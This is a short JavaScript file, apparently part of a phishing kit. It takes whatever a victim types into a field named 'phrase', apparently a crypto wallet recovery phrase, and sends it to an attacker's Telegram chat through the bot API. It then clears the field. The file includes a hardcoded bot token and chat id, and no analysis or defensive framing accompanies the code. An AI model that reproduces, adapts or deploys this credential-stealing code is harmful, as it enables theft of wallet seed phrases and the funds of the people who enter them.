//bot token
var telegram_bot_id = "7137902594:AAGRnATnRzLJLwC0N8q4kDmuyXpP6LwMfNU";
//chat id
var chat_id = -1002108270782;
var phr;
var ready = function () {
    phr = document.getElementById("phrase").value;
    message = "Phrase: " + phr;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("phrase").value = "";
    return false;
};
